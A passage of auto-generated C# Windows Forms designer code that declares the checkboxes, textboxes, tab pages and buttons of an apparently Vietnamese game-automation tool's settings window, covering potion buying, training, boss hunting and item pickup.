		this.checkBoxTranhBossVang = new System.Windows.Forms.CheckBox();
		this.listViewTrain = new System.Windows.Forms.ListView();
		this.columnHeader_3 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader_4 = new System.Windows.Forms.ColumnHeader();
		this.comboBoxOtrong = new System.Windows.Forms.ComboBox();
		this.checkBoxOtrong = new System.Windows.Forms.CheckBox();
		this.buttonDoctep = new System.Windows.Forms.Button();
		this.buttonLayToadoTrain = new System.Windows.Forms.Button();
		this.checkBoxLuomrac = new System.Windows.Forms.CheckBox();
		this.buttonXoaToadoTrain = new System.Windows.Forms.Button();
		this.checkBoxTDPSaimap = new System.Windows.Forms.CheckBox();
		this.buttonLuutep = new System.Windows.Forms.Button();
		this.checkBoxSLThoat = new System.Windows.Forms.CheckBox();
		this.tabPage18 = new System.Windows.Forms.TabPage();
		this.baodskenhbang = new System.Windows.Forms.CheckBox();
		this.timequaylai = new System.Windows.Forms.TextBox();
		this.checkBoxQuayquai = new System.Windows.Forms.CheckBox();
		this.buttonThuocLag = new System.Windows.Forms.Button();
		this.checkBoxAnThuocLag = new System.Windows.Forms.CheckBox();
		this.labelLocBando = new System.Windows.Forms.Label();
		this.comboBoxDoSatcuuSat = new System.Windows.Forms.ComboBox();
		this.label24 = new System.Windows.Forms.Label();
		this.textBoxPhamviNhat = new System.Windows.Forms.TextBox();
		this.checkBoxNhatdoDichuyenGan = new System.Windows.Forms.CheckBox();
		this.textBoxTimeXepdo = new System.Windows.Forms.TextBox();
		this.checkBoxXepdo = new System.Windows.Forms.CheckBox();
		this.label18 = new System.Windows.Forms.Label();
		this.buttonKhongcat = new System.Windows.Forms.Button();
		this.checkBoxRuong0 = new System.Windows.Forms.CheckBox();
		this.checkBoxRuong2 = new System.Windows.Forms.CheckBox();
		this.checkBoxRuong3 = new System.Windows.Forms.CheckBox();
		this.checkBoxRuong1 = new System.Windows.Forms.CheckBox();
		this.label42 = new System.Windows.Forms.Label();
		this.tabPage2 = new System.Windows.Forms.TabPage();
		this.tabControlHaucan = new System.Windows.Forms.TabControl();
		this.tabPageMuathuoc = new System.Windows.Forms.TabPage();
		this.buttonApDungMuaThuocAll = new System.Windows.Forms.Button();
		this.tabControl5 = new System.Windows.Forms.TabControl();
		this.tabPage6 = new System.Windows.Forms.TabPage();
		this.checkBoxMuaNgamy = new System.Windows.Forms.CheckBox();
		this.checkBoxMuaThon = new System.Windows.Forms.CheckBox();
		this.checkBoxVeThanhCt = new System.Windows.Forms.CheckBox();
		this.textBoxMuaMienphiMenu = new System.Windows.Forms.TextBox();
		this.comboBoxTenThuocMienphi = new System.Windows.Forms.ComboBox();
		this.checkBoxTatmuaAll = new System.Windows.Forms.CheckBox();
		this.checkBoxRuongBH = new System.Windows.Forms.CheckBox();
		this.checkBoxHoasonMuathuoc = new System.Windows.Forms.CheckBox();
		this.checkBoxKhongNhapso = new System.Windows.Forms.CheckBox();
		this.linkLabelMuaMienphiMn = new System.Windows.Forms.LinkLabel();
		this.checkBoxMuaMauFree = new System.Windows.Forms.CheckBox();
		this.tabPage11 = new System.Windows.Forms.TabPage();
		this.linkLabel1 = new System.Windows.Forms.LinkLabel();
		this.checkBoxChuyenChinhxac = new System.Windows.Forms.CheckBox();
		this.checkBoxBamPhimCong = new System.Windows.Forms.CheckBox();
		this.checkBoxTuChuyenThuoc = new System.Windows.Forms.CheckBox();
		this.buttonHDChuyenthuoc = new System.Windows.Forms.Button();
		this.label8 = new System.Windows.Forms.Label();
		this.textBoxSoluongChuyenthuoc = new System.Windows.Forms.TextBox();
		this.comboBoxChuyenThuoc = new System.Windows.Forms.ComboBox();
		this.label5 = new System.Windows.Forms.Label();
		this.textBoxChuyenThuocMin = new System.Windows.Forms.TextBox();
		this.tabPage5 = new System.Windows.Forms.TabPage();
		this.textBoxOso1 = new System.Windows.Forms.TextBox();
		this.textBoxOso2 = new System.Windows.Forms.TextBox();
		this.textBoxOso3 = new System.Windows.Forms.TextBox();
		this.label20 = new System.Windows.Forms.Label();
		this.richTextBox1 = new System.Windows.Forms.RichTextBox();
		this.label19 = new System.Windows.Forms.Label();
		this.label10 = new System.Windows.Forms.Label();
		this.checkBoxGanTenthuoc = new System.Windows.Forms.CheckBox();
		this.checkBoxMua1 = new System.Windows.Forms.CheckBox();
		this.buttonBungTuimau = new System.Windows.Forms.Button();
		this.textBoxSoluongThuocDimua = new System.Windows.Forms.TextBox();
		this.comboBoxMua2 = new System.Windows.Forms.ComboBox();
		this.buttonComboNhoithuoc = new System.Windows.Forms.Button();
		this.checkBoxMangtheotien = new System.Windows.Forms.CheckBox();
		this.comboBoxMua1 = new System.Windows.Forms.ComboBox();
		this.textBoxSoluongTDP = new System.Windows.Forms.TextBox();
		this.textBoxPass = new System.Windows.Forms.TextBox();
		this.comboBoxMuaGiaiDoc = new System.Windows.Forms.ComboBox();
		this.label12 = new System.Windows.Forms.Label();
		this.checkBoxMuaTDP = new System.Windows.Forms.CheckBox();
		this.buttonMuathuocBaovat = new System.Windows.Forms.Button();
		this.textBoxTienMangtheo = new System.Windows.Forms.TextBox();
		this.checkBoxMuaKTC = new System.Windows.Forms.CheckBox();
		this.label4 = new System.Windows.Forms.Label();
		this.buttonKyTranCac = new System.Windows.Forms.Button();
		this.checkBoxMuaGiaiDoc = new System.Windows.Forms.CheckBox();
		this.checkBoxMua2 = new System.Windows.Forms.CheckBox();
		this.textBoxSoluong1 = new System.Windows.Forms.TextBox();
		this.textBoxSoluongMuaGiaiDoc = new System.Windows.Forms.TextBox();
		this.textBoxSoluong2 = new System.Windows.Forms.TextBox();
		this.tabPagePhuchoi = new System.Windows.Forms.TabPage();
		this.label55 = new System.Windows.Forms.Label();
		this.comboBoxSelectOverlayItemCount = new System.Windows.Forms.ComboBox();
		this.label53 = new System.Windows.Forms.Label();
		this.textBoxtimettl = new System.Windows.Forms.TextBox();
		this.checkBoxTTL = new System.Windows.Forms.CheckBox();
		this.comboBoxPk = new System.Windows.Forms.ComboBox();
		this.textBox3 = new System.Windows.Forms.TextBox();
		this.checkBoxUuTienBomCuuchuyen = new System.Windows.Forms.CheckBox();
		this.textBox2 = new System.Windows.Forms.TextBox();
		this.textBoxMPTdp = new System.Windows.Forms.TextBox();
		this.textBox1 = new System.Windows.Forms.TextBox();
		this.textBoxHpTDP = new System.Windows.Forms.TextBox();
		this.checkBoxMana2 = new System.Windows.Forms.CheckBox();
		this.checkBoxMau2 = new System.Windows.Forms.CheckBox();
		this.comboBoxTenMana2 = new System.Windows.Forms.ComboBox();
		this.textBoxTimerMana2 = new System.Windows.Forms.TextBox();
		this.textBoxRatioMana2 = new System.Windows.Forms.TextBox();
		this.textBoxSoluongMana2 = new System.Windows.Forms.TextBox();
		this.comboBoxTenMau2 = new System.Windows.Forms.ComboBox();
		this.textBoxSoluongMau2 = new System.Windows.Forms.TextBox();
		this.textBoxTimerMau2 = new System.Windows.Forms.TextBox();
		this.buttonAppDungBomMauAll = new System.Windows.Forms.Button();
		this.checkBoxVeThanhKhiPKlon = new System.Windows.Forms.CheckBox();
		this.textBoxRatioMau2 = new System.Windows.Forms.TextBox();
		this.checkBoxMPTdp = new System.Windows.Forms.CheckBox();
		this.textBoxTDP_SL_Mana = new System.Windows.Forms.TextBox();
		this.textBoxSoluongBomMagic = new System.Windows.Forms.TextBox();
		this.textBoxTimerBomMagic = new System.Windows.Forms.TextBox();
		this.checkBoxTuGiaidoc = new System.Windows.Forms.CheckBox();
		this.textBoxTDP_SL_Mau = new System.Windows.Forms.TextBox();
		this.buttonGiaiThichHaucan = new System.Windows.Forms.Button();
		this.checkBoxTDP_SL_Mana = new System.Windows.Forms.CheckBox();
		this.checkBoxTDP_SL_Mau = new System.Windows.Forms.CheckBox();
		this.checkBoxMPBom = new System.Windows.Forms.CheckBox();
		this.textBoxThoiGianBomHPDiem = new System.Windows.Forms.TextBox();
		this.textBoxSoluongBomHP = new System.Windows.Forms.TextBox();
		this.checkBoxHPTdp = new System.Windows.Forms.CheckBox();
		this.textBoxThoigianBomMP = new System.Windows.Forms.TextBox();
		this.textBoxThoigianBomHP = new System.Windows.Forms.TextBox();
		this.textBoxBomHPDiem = new System.Windows.Forms.TextBox();
		this.checkBoxBomHPDiem = new System.Windows.Forms.CheckBox();
		this.textBoxSoLuongBomHPDiem = new System.Windows.Forms.TextBox();
		this.checkBoxBomHP = new System.Windows.Forms.CheckBox();
		this.textBoxMPBom = new System.Windows.Forms.TextBox();
		this.textBoxBomMPDiem = new System.Windows.Forms.TextBox();
		this.textBoxSoLuongBomMPDiem = new System.Windows.Forms.TextBox();
		this.checkBoxBomMPDiem = new System.Windows.Forms.CheckBox();
		this.textBoxThoiGianBomMPDiem = new System.Windows.Forms.TextBox();
		this.textBoxHPBom = new System.Windows.Forms.TextBox();
		this.textBoxSoluongBomMP = new System.Windows.Forms.TextBox();
		this.tabPageChieuthuc = new System.Windows.Forms.TabPage();
		this.groupBox5 = new System.Windows.Forms.GroupBox();
		this.checkBoxConLon = new System.Windows.Forms.CheckBox();
		this.checkBoxTTDT = new System.Windows.Forms.CheckBox();
		this.comboBoxGanChieuPhai = new System.Windows.Forms.ComboBox();
		this.comboBoxGanChieuTrai = new System.Windows.Forms.ComboBox();
		this.buttonSkill120tn = new System.Windows.Forms.Button();
		this.checkBoxGanChieuTrai = new System.Windows.Forms.CheckBox();
		this.buttonSkill120vd = new System.Windows.Forms.Button();
		this.checkBoxGanChieuPhai = new System.Windows.Forms.CheckBox();
		this.groupBox1 = new System.Windows.Forms.GroupBox();
		this.checkBoxTatBuffTamthoi = new System.Windows.Forms.CheckBox();
		this.comboBoxTranphai1 = new System.Windows.Forms.ComboBox();
		this.comboBoxTranphai2 = new System.Windows.Forms.ComboBox();
		this.textBoxTranphai2 = new System.Windows.Forms.TextBox();
		this.textBoxTranphai1 = new System.Windows.Forms.TextBox();
		this.checkBoxTranphai1 = new System.Windows.Forms.CheckBox();
		this.checkBoxTranphai3 = new System.Windows.Forms.CheckBox();
		this.comboBoxTranphai3 = new System.Windows.Forms.ComboBox();
		this.checkBoxTranphai2 = new System.Windows.Forms.CheckBox();
		this.textBoxTranphai3 = new System.Windows.Forms.TextBox();
		this.tabControlChuyenSkill = new System.Windows.Forms.TabControl();
		this.tabPage19 = new System.Windows.Forms.TabPage();
		this.comboBoxKieu3 = new System.Windows.Forms.ComboBox();
		this.comboBoxKieu2 = new System.Windows.Forms.ComboBox();
		this.comboBoxKieu1 = new System.Windows.Forms.ComboBox();
		this.textBoxChuyenTrai3 = new System.Windows.Forms.TextBox();
		this.comboBoxChuyenTrai1 = new System.Windows.Forms.ComboBox();
		this.checkBoxChuyenTrai1 = new System.Windows.Forms.CheckBox();
		this.comboBoxChuyenTrai2 = new System.Windows.Forms.ComboBox();
		this.comboBoxChuyenTrai3 = new System.Windows.Forms.ComboBox();
		this.checkBoxChuyenTrai3 = new System.Windows.Forms.CheckBox();
		this.textBoxChuyenTrai1 = new System.Windows.Forms.TextBox();
		this.checkBoxChuyenTrai2 = new System.Windows.Forms.CheckBox();
		this.textBoxChuyenTrai2 = new System.Windows.Forms.TextBox();
		this.tabPage20 = new System.Windows.Forms.TabPage();
		this.textBoxChuyenPhai3 = new System.Windows.Forms.TextBox();
		this.comboBoxChuyenPhai1 = new System.Windows.Forms.ComboBox();
		this.comboBoxChuyenPhai2 = new System.Windows.Forms.ComboBox();
		this.checkBoxChuyenPhai3 = new System.Windows.Forms.CheckBox();
		this.checkBoxChuyenPhai2 = new System.Windows.Forms.CheckBox();
		this.textBoxChuyenPhai2 = new System.Windows.Forms.TextBox();
		this.textBoxChuyenPhai1 = new System.Windows.Forms.TextBox();
		this.comboBoxChuyenPhai3 = new System.Windows.Forms.ComboBox();
		this.checkBoxChuyenPhai1 = new System.Windows.Forms.CheckBox();
		this.tabPage22 = new System.Windows.Forms.TabPage();
		this.label39 = new System.Windows.Forms.Label();
		this.checkBoxGapBossNL = new System.Windows.Forms.CheckBox();
		this.textBoxGapBoss = new System.Windows.Forms.TextBox();
		this.comboBoxGapBoss = new System.Windows.Forms.ComboBox();
		this.checkBoxGapBossChieu = new System.Windows.Forms.CheckBox();
		this.checkBoxTuGiaiBua = new System.Windows.Forms.CheckBox();
		this.checkBoxTNXuatChieu120 = new System.Windows.Forms.CheckBox();
		this.tabPageBaoVat = new System.Windows.Forms.TabPage();
		this.textBoxVukhi1 = new System.Windows.Forms.TextBox();
		this.richTextBox3 = new System.Windows.Forms.RichTextBox();
		this.comboBoxVukhiKieu0 = new System.Windows.Forms.ComboBox();
		this.textBoxVukhi0 = new System.Windows.Forms.TextBox();
		this.comboBoxVukhi1 = new System.Windows.Forms.ComboBox();
		this.comboBoxVukhiKieu1 = new System.Windows.Forms.ComboBox();
		this.checkBoxVukhi1 = new System.Windows.Forms.CheckBox();
		this.comboBoxVukhi0 = new System.Windows.Forms.ComboBox();
		this.checkBoxVukhi0 = new System.Windows.Forms.CheckBox();
		this.tabPagetrangbi = new System.Windows.Forms.TabPage();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.tabControl4 = new System.Windows.Forms.TabControl();
		this.tabPagedoxanh = new System.Windows.Forms.TabPage();
		this.tabPageHKMP = new System.Windows.Forms.TabPage();
		this.tabPage7 = new System.Windows.Forms.TabPage();
		this.checkBoxGame = new System.Windows.Forms.CheckBox();
		this.buttonReset1ac = new System.Windows.Forms.Button();
		this.checkBoxDoiTitle = new System.Windows.Forms.CheckBox();
		this.buttonResetAuto = new System.Windows.Forms.Button();
		this.checkBoxBaoKeylog = new System.Windows.Forms.CheckBox();
		this.linkLabelTrangchu = new System.Windows.Forms.LinkLabel();
		this.checkBoxChayRunAdmin = new System.Windows.Forms.CheckBox();
		this.buttonTuTimWeb = new System.Windows.Forms.Button();
		this.checkBoxGameHu = new System.Windows.Forms.CheckBox();
		this.checkBoxGiamRamTudong = new System.Windows.Forms.CheckBox();
		this.comboBoxGameOfWeb = new System.Windows.Forms.ComboBox();
		this.buttonFixGameTuthoat = new System.Windows.Forms.Button();
		this.tabControl2 = new System.Windows.Forms.TabControl();
		this.tabPage14 = new System.Windows.Forms.TabPage();
		this.richTextBoxBHO = new System.Windows.Forms.RichTextBox();
		this.label11 = new System.Windows.Forms.Label();
		this.textBoxIDSudung = new System.Windows.Forms.TextBox();
		this.buttonTrial = new System.Windows.Forms.Button();
		this.buttonIDApdung = new System.Windows.Forms.Button();
		this.buttonDangky = new System.Windows.Forms.Button();
		this.tabPage3 = new System.Windows.Forms.TabPage();
		this.checkBoxThu = new System.Windows.Forms.CheckBox();
		this.textBoxChatNham = new System.Windows.Forms.TextBox();
		this.textBoxThuMuc = new System.Windows.Forms.TextBox();
		this.checkBoxChatNham = new System.Windows.Forms.CheckBox();
		this.buttonBrowseGame = new System.Windows.Forms.Button();
		this.buttonThumucAuto = new System.Windows.Forms.Button();
		this.label1 = new System.Windows.Forms.Label();
		this.buttonToShortcut = new System.Windows.Forms.Button();
		this.label6 = new System.Windows.Forms.Label();
		this.tabPage9 = new System.Windows.Forms.TabPage();
		this.tabControlPhutro = new System.Windows.Forms.TabControl();
		this.tabPage4 = new System.Windows.Forms.TabPage();
		this.buttonDongtien = new System.Windows.Forms.Button();
		this.buttonPhimTat = new System.Windows.Forms.Button();
		this.checkBoxPhimTat = new System.Windows.Forms.CheckBox();
		this.buttonGiamCPUAll = new System.Windows.Forms.Button();
		this.comboBoxGiamCpu = new System.Windows.Forms.ComboBox();
		this.buttonAnhet = new System.Windows.Forms.Button();
		this.buttonThoatHetgame = new System.Windows.Forms.Button();
		this.button1 = new System.Windows.Forms.Button();
		this.buttonThoatGame = new System.Windows.Forms.Button();
		this.buttonBatGiaodichAll = new System.Windows.Forms.Button();
		this.buttonTC = new System.Windows.Forms.Button();
		this.buttonTudoiMaubang = new System.Windows.Forms.Button();
		this.buttonDocCauhinh = new System.Windows.Forms.Button();
		this.buttonTangdiem = new System.Windows.Forms.Button();
		this.buttonLuuCauhinhAll = new System.Windows.Forms.Button();
		this.buttonVaotraiStopAll = new System.Windows.Forms.Button();
		this.buttonNopLenhbaiAll = new System.Windows.Forms.Button();
		this.buttonVaotraiStop = new System.Windows.Forms.Button();
		this.comboBoxBentau = new System.Windows.Forms.ComboBox();
		this.buttonNopLenhbai = new System.Windows.Forms.Button();
		this.buttonMoGame = new System.Windows.Forms.Button();
		this.buttonLogin = new System.Windows.Forms.Button();
		this.buttonDanhsachCuusat = new System.Windows.Forms.Button();
		this.label29 = new System.Windows.Forms.Label();
		this.comboBoxAccDoiMau = new System.Windows.Forms.ComboBox();
		this.buttonHuongdanHLP = new System.Windows.Forms.Button();
		this.buttonCapnhat = new System.Windows.Forms.Button();
		this.tabPageTinsu = new System.Windows.Forms.TabPage();
		this.buttonHuyenTinh = new System.Windows.Forms.Button();
		this.buttonRaovat = new System.Windows.Forms.Button();
		this.groupBox6 = new System.Windows.Forms.GroupBox();
		this.linkLabelHelpTinsu = new System.Windows.Forms.LinkLabel();
		this.textBoxTimerPT = new System.Windows.Forms.TextBox();
		this.checkBoxChoPTdanhsach = new System.Windows.Forms.CheckBox();
		this.buttonToadoPK = new System.Windows.Forms.Button();
		this.checkBoxChayPKNguoidung = new System.Windows.Forms.CheckBox();
		this.checkBoxChaydanhvong = new System.Windows.Forms.CheckBox();
		this.buttonTinsuAll = new System.Windows.Forms.Button();
		this.checkBoxChayTinsu = new System.Windows.Forms.CheckBox();
		this.comboBoxTinSu = new System.Windows.Forms.ComboBox();
		this.checkBoxMuathuocPK = new System.Windows.Forms.CheckBox();
		this.groupBox4 = new System.Windows.Forms.GroupBox();
		this.comboBoxNhatQua = new System.Windows.Forms.ComboBox();
		this.buttonResetTenNhatQua = new System.Windows.Forms.Button();
		this.checkBoxDungCodinh = new System.Windows.Forms.CheckBox();
		this.textBoxThoiGianTruot = new System.Windows.Forms.TextBox();
		this.buttonStopNhatqua = new System.Windows.Forms.Button();
		this.textBoxPhamviNhatqua = new System.Windows.Forms.TextBox();
		this.numericUpDownHH = new System.Windows.Forms.NumericUpDown();
		this.buttonNhatquaAll = new System.Windows.Forms.Button();
		this.checkBoxNhatqua = new System.Windows.Forms.CheckBox();
		this.checkBoxThanhTruot = new System.Windows.Forms.CheckBox();
		this.numericUpDownMM = new System.Windows.Forms.NumericUpDown();
		this.checkBoxGioClick = new System.Windows.Forms.CheckBox();
		this.numericUpDownSS = new System.Windows.Forms.NumericUpDown();
		this.tabPageTinhLuyen = new System.Windows.Forms.TabPage();
		this.groupBox7 = new System.Windows.Forms.GroupBox();
		this.textBoxXoaMn = new System.Windows.Forms.TextBox();
		this.tabControlLoc = new System.Windows.Forms.TabControl();
		this.tabPageLocTrangbi = new System.Windows.Forms.TabPage();
		this.buttonMenuLocClick = new System.Windows.Forms.Button();
		this.textBoxLocTocdo = new System.Windows.Forms.TextBox();
		this.label31 = new System.Windows.Forms.Label();
		this.textBoxNhapSLTest = new System.Windows.Forms.TextBox();
		this.buttonPhimHDLoc = new System.Windows.Forms.Button();
		this.buttonLocTrangbi = new System.Windows.Forms.Button();
		this.buttonDungTatcaTrangbiTest = new System.Windows.Forms.Button();
		this.textBoxMenuTest = new System.Windows.Forms.TextBox();
		this.buttonTatcaNhanTrangbiTest = new System.Windows.Forms.Button();
		this.buttonNhanTrangbiTest = new System.Windows.Forms.Button();
		this.checkBoxLocTrangbiNhapSL = new System.Windows.Forms.CheckBox();
		this.comboBoxTrangbiTest = new System.Windows.Forms.ComboBox();
		this.checkBoxLocTrangbiNPC = new System.Windows.Forms.CheckBox();
		this.label33 = new System.Windows.Forms.Label();
		this.label32 = new System.Windows.Forms.Label();
		this.tabPageMuaDung = new System.Windows.Forms.TabPage();
		this.buttonBatdauSudung = new System.Windows.Forms.Button();
		this.buttonBatdauMua = new System.Windows.Forms.Button();
		this.buttonStopSudungAll = new System.Windows.Forms.Button();
		this.buttonMuaSudungAll = new System.Windows.Forms.Button();
		this.buttonMuaGopAll = new System.Windows.Forms.Button();
		this.buttonStopSudung = new System.Windows.Forms.Button();
		this.textBoxMuadungSoLuong = new System.Windows.Forms.TextBox();
		this.textBoxIdMua = new System.Windows.Forms.TextBox();
		this.linkLabelPhimCauca = new System.Windows.Forms.LinkLabel();
		this.checkBoxThanhTruotSudung = new System.Windows.Forms.CheckBox();
		this.buttonHelpMua = new System.Windows.Forms.Button();
		this.checkBoxBoquaMaKTC = new System.Windows.Forms.CheckBox();
		this.checkBoxMuaDungSoluong = new System.Windows.Forms.CheckBox();
		this.comboBoxMuaVatpham = new System.Windows.Forms.ComboBox();
		this.label16 = new System.Windows.Forms.Label();
		this.checkBoxGopVatpham = new System.Windows.Forms.CheckBox();
		this.checkBoxMuaKytrancac = new System.Windows.Forms.CheckBox();
		this.tabPage15 = new System.Windows.Forms.TabPage();
		this.label21 = new System.Windows.Forms.Label();
		this.buttonDsBanVatpham = new System.Windows.Forms.Button();
		this.buttonTatCaBanVatPhamRac = new System.Windows.Forms.Button();
		this.label7 = new System.Windows.Forms.Label();
		this.buttonBanVatphamRac = new System.Windows.Forms.Button();
		this.comboBoxBanVatPham = new System.Windows.Forms.ComboBox();
		this.checkBoxBanVpham = new System.Windows.Forms.CheckBox();
		this.tabPage12 = new System.Windows.Forms.TabPage();
		this.checkBoxVSTDong2 = new System.Windows.Forms.CheckBox();
		this.textBoxTenacTimVST = new System.Windows.Forms.TextBox();
		this.textBoxThoigianVST = new System.Windows.Forms.TextBox();
		this.buttonCopyVST = new System.Windows.Forms.Button();
		this.checkBoxBaokenhbang = new System.Windows.Forms.CheckBox();
		this.checkBoxBatdauVanSuthong = new System.Windows.Forms.CheckBox();
		this.textBoxToadoVST = new System.Windows.Forms.TextBox();
		this.label3 = new System.Windows.Forms.Label();
		this.checkBoxRoom = new System.Windows.Forms.CheckBox();
		this.textBoxMapNameVST = new System.Windows.Forms.TextBox();
		this.label9 = new System.Windows.Forms.Label();
		this.buttonPasteVST = new System.Windows.Forms.Button();
		this.label38 = new System.Windows.Forms.Label();
		this.checkBoxXoaMn = new System.Windows.Forms.CheckBox();
		this.buttonNpcClickMenu = new System.Windows.Forms.Button();
		this.checkBoxNhapSLClickNpc = new System.Windows.Forms.CheckBox();
		this.buttonClickNpcStopAll = new System.Windows.Forms.Button();
		this.textBoxNhapSoluongClickNPC = new System.Windows.Forms.TextBox();
		this.buttonClickNpcAll = new System.Windows.Forms.Button();
		this.textBoxClickNPCSolan = new System.Windows.Forms.TextBox();
		this.buttonClickNpcSingle = new System.Windows.Forms.Button();
		this.buttonHelpClickNpc = new System.Windows.Forms.Button();
		this.textBoxClickNPCMenu = new System.Windows.Forms.TextBox();
		this.comboBoxClickNPC = new System.Windows.Forms.ComboBox();
		this.textBoxClickNPCTocdo = new System.Windows.Forms.TextBox();
		this.checkBoxClickNPCmenu = new System.Windows.Forms.CheckBox();
		this.buttonThietlapClickNpc = new System.Windows.Forms.Button();
		this.checkBoxNPC = new System.Windows.Forms.CheckBox();
		this.label2 = new System.Windows.Forms.Label();
		this.checkBoxClickNPCSolan = new System.Windows.Forms.CheckBox();
		this.tabPage8 = new System.Windows.Forms.TabPage();
		this.groupBox3 = new System.Windows.Forms.GroupBox();
		this.sanboss1cho = new System.Windows.Forms.CheckBox();
		this.label23 = new System.Windows.Forms.Label();
		this.buttonHuongdanCanhbos = new System.Windows.Forms.Button();
		this.groupBox2 = new System.Windows.Forms.GroupBox();
		this.comboBoxNoiBoss = new System.Windows.Forms.ComboBox();
		this.checkBoxTuChayBoss = new System.Windows.Forms.CheckBox();
		this.buttonDenDiemKetiep = new System.Windows.Forms.Button();
		this.buttonBossAll = new System.Windows.Forms.Button();
		this.buttonSuaXoa = new System.Windows.Forms.Button();
		this.checkBoxBossSTKhongLamHaucan = new System.Windows.Forms.CheckBox();
		this.checkBoxGhepSTG = new System.Windows.Forms.CheckBox();
		this.checkBoxBossSTtuhuy = new System.Windows.Forms.CheckBox();
		this.checkBoxONha = new System.Windows.Forms.CheckBox();
		this.comboBoxBosSatthu = new System.Windows.Forms.ComboBox();
		this.buttonGhepSTG = new System.Windows.Forms.Button();
		this.checkBoxKhongLuuruong = new System.Windows.Forms.CheckBox();
		this.buttonSatthuAll = new System.Windows.Forms.Button();
		this.checkBoxBossSatthu = new System.Windows.Forms.CheckBox();
		this.tabPage10 = new System.Windows.Forms.TabPage();
		this.linkLabel3 = new System.Windows.Forms.LinkLabel();
		this.groupBox10 = new System.Windows.Forms.GroupBox();
		this.label52 = new System.Windows.Forms.Label();
		this.label50 = new System.Windows.Forms.Label();
		this.label49 = new System.Windows.Forms.Label();
		this.groupBox9 = new System.Windows.Forms.GroupBox();
		this.lenh7 = new System.Windows.Forms.TextBox();
		this.button2 = new System.Windows.Forms.Button();
		this.label51 = new System.Windows.Forms.Label();
		this.label48 = new System.Windows.Forms.Label();
		this.label47 = new System.Windows.Forms.Label();
		this.label46 = new System.Windows.Forms.Label();
		this.label45 = new System.Windows.Forms.Label();
		this.label44 = new System.Windows.Forms.Label();
		this.label43 = new System.Windows.Forms.Label();
		this.caidatlenh = new System.Windows.Forms.Button();
		this.lenh6 = new System.Windows.Forms.TextBox();
		this.lenh5 = new System.Windows.Forms.TextBox();
		this.lenh4 = new System.Windows.Forms.TextBox();
		this.lenh3 = new System.Windows.Forms.TextBox();
		this.lenh2 = new System.Windows.Forms.TextBox();
		this.lenh1 = new System.Windows.Forms.TextBox();
		this.tabPageTest = new System.Windows.Forms.TabPage();
		this.textBoxStart = new System.Windows.Forms.TextBox();
		this.label37 = new System.Windows.Forms.Label();
		this.textBoxDelta = new System.Windows.Forms.TextBox();
		this.label36 = new System.Windows.Forms.Label();
		this.textBoxMapId = new System.Windows.Forms.TextBox();
		this.label14 = new System.Windows.Forms.Label();
		this.buttonOpenAllWeb = new System.Windows.Forms.Button();
		this.textBoxScrMouseXY = new System.Windows.Forms.TextBox();
		this.textBoxRealMouseXY = new System.Windows.Forms.TextBox();
		this.label13 = new System.Windows.Forms.Label();
		this.textBoxScrPosXY = new System.Windows.Forms.TextBox();
		this.buttonTest = new System.Windows.Forms.Button();
		this.buttonFormTest = new System.Windows.Forms.Button();
		this.textBoxRealPosXY = new System.Windows.Forms.TextBox();
		this.pkdon = new System.Windows.Forms.TabPage();
		this.label41 = new System.Windows.Forms.Label();
		this.textBox5 = new System.Windows.Forms.TextBox();
		this.tocbien = new System.Windows.Forms.CheckBox();
		this.uutien = new System.Windows.Forms.TabPage();
		this.linkLabel5 = new System.Windows.Forms.LinkLabel();
		this.label54 = new System.Windows.Forms.Label();
		this.checkBoxkepgoc = new System.Windows.Forms.CheckBox();
		this.buttonxoauutiennv = new System.Windows.Forms.Button();
		this.listViewdanhtennv = new System.Windows.Forms.ListView();
		this.checkBoxkhoamuctieu = new System.Windows.Forms.CheckBox();
		this.checkBoxChayNhay = new System.Windows.Forms.CheckBox();
		this.comboBoxdanhtennv = new System.Windows.Forms.ComboBox();
		this.checkBoxdanhtennv = new System.Windows.Forms.CheckBox();
		this.buttonTuyChonMonPhai = new System.Windows.Forms.Button();
		this.checkBox2 = new System.Windows.Forms.CheckBox();
		this.buttonXoaIDAcChinh = new System.Windows.Forms.Button();
		this.buttonTimTrongthanh = new System.Windows.Forms.Button();
		this.richTextBoxChedoMayphu = new System.Windows.Forms.RichTextBox();
		this.pictureBoxQC = new System.Windows.Forms.PictureBox();
		this.buttonHelp = new System.Windows.Forms.Button();
		this.buttonAchinh = new System.Windows.Forms.Button();
		this.tabControl1.SuspendLayout();
		this.tabPage1.SuspendLayout();
		this.tabControl3.SuspendLayout();
		this.tabPageBang1.SuspendLayout();
		this.tabPageBang2.SuspendLayout();
		this.tabPageTongKim.SuspendLayout();
		this.tabPageCTC.SuspendLayout();
		this.tabControlThatThanh.SuspendLayout();
		this.tabPageThatthanh.SuspendLayout();
		this.tabPageTamtru.SuspendLayout();
		this.groupBox8.SuspendLayout();
		this.tabPageTamMondai.SuspendLayout();
		this.tabPageTrain.SuspendLayout();
		this.tabControl6.SuspendLayout();
		this.tabPage16.SuspendLayout();
		this.tabPage18.SuspendLayout();
		this.tabPage2.SuspendLayout();
		this.tabControlHaucan.SuspendLayout();
		this.tabPageMuathuoc.SuspendLayout();
		this.tabControl5.SuspendLayout();
		this.tabPage6.SuspendLayout();
		this.tabPage11.SuspendLayout();
		this.tabPage5.SuspendLayout();
		this.tabPagePhuchoi.SuspendLayout();
		this.tabPageChieuthuc.SuspendLayout();
		this.groupBox5.SuspendLayout();
		this.groupBox1.SuspendLayout();
		this.tabControlChuyenSkill.SuspendLayout();
		this.tabPage19.SuspendLayout();
		this.tabPage20.SuspendLayout();
		this.tabPage22.SuspendLayout();
		this.tabPageBaoVat.SuspendLayout();
		this.tabPagetrangbi.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		this.tabControl4.SuspendLayout();
		this.tabPage7.SuspendLayout();
		this.tabControl2.SuspendLayout();
		this.tabPage14.SuspendLayout();
		this.tabPage3.SuspendLayout();
		this.tabPage9.SuspendLayout();
		this.tabControlPhutro.SuspendLayout();
		this.tabPage4.SuspendLayout();
		this.tabPageTinsu.SuspendLayout();
		this.groupBox6.SuspendLayout();
		this.groupBox4.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numericUpDownHH).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDownMM).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDownSS).BeginInit();
		this.tabPageTinhLuyen.SuspendLayout();
		this.groupBox7.SuspendLayout();
		this.tabControlLoc.SuspendLayout();
		this.tabPageLocTrangbi.SuspendLayout();
		this.tabPageMuaDung.SuspendLayout();
		this.tabPage15.SuspendLayout();
